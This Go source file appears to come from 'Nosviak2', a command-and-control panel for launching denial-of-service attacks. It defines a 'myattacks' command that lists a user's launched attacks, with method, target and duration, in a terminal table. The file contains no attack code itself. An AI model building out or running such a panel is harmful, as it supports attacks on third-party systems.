package commands

import (
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/clients/views/pager"
	"Nosviak2/core/configs"
	"Nosviak2/core/database"
	"Nosviak2/core/sources/language"
	"Nosviak2/core/sources/language/lexer"
	"Nosviak2/core/sources/tools"
	"Nosviak2/core/sources/views"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

func init() {

	MakeCommand(&Command{
		CommandName:        "myattacks",
		Aliases:            []string{"myattack", "mysent", "mylaunched"},
		CommandPermissions: make([]string, 0),
		CommandDescription: "view all your launched attacks",
		CommandFunction: func(s *sessions.Session, cmd []string) error {

			//gets all the attacks which have been launched
			//this will ensure its done without issues happening
			launched, err := database.Conn.UserSent(s.User.Username)
			if err != nil { //err handles properly
				return language.ExecuteLanguage([]string{"commands", "myattacks", "database-error.itl"}, s.Channel, deployment.Engine, s, make(map[string]string))
			}

			//makes the simpletable properly
			//used within the system properly
			table := simpletable.New()
			//sets table header
			//this will be used to define information
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{ //sets the values properly without issues happening
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "myattacks", "headers", "date.txt").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "myattacks", "headers", "method.txt").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "myattacks", "headers", "target.txt").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "myattacks", "headers", "duration.txt").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "myattacks", "headers", "finished.txt").Containing, lexer.Escapes)},
				},
			}
			//ranges through all attacks launched
			//this will allow it to be inserted within it
			for _, systemLaunched := range launched { //ranges
				//creates the store properly without issues
				rk := []*simpletable.Cell{ //fills with the information properly without issues
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "myattacks", "values", "date.txt").Containing, lexer.Escapes), "<<$date>>", time.Unix(systemLaunched.Created, 0).Format("2/01/2006 15:04:05"))},
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "myattacks", "values", "method.txt").Containing, lexer.Escapes), "<<$method>>", systemLaunched.Method)},
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "myattacks", "values", "target.txt").Containing, lexer.Escapes), "<<$target>>", systemLaunched.Target)},
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "myattacks", "values", "duration.txt").Containing, lexer.Escapes), "<<$duration>>", strconv.Itoa(systemLaunched.Duration))},
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "myattacks", "values", "finished.txt").Containing, lexer.Escapes), "<<$finished>>", tools.ResolveTimeStamp(time.Unix(systemLaunched.Finish, 0), false))},
				}
				//saves into the array correctly
				//this will be properly founded later onwards
				table.Body.Cells = append(table.Body.Cells, rk)
			}

			//renders the table properly
			//this will ensure its done without issues
			return pager.MakeTable("myattacks", table, s).TextureTable()
		},
	})
}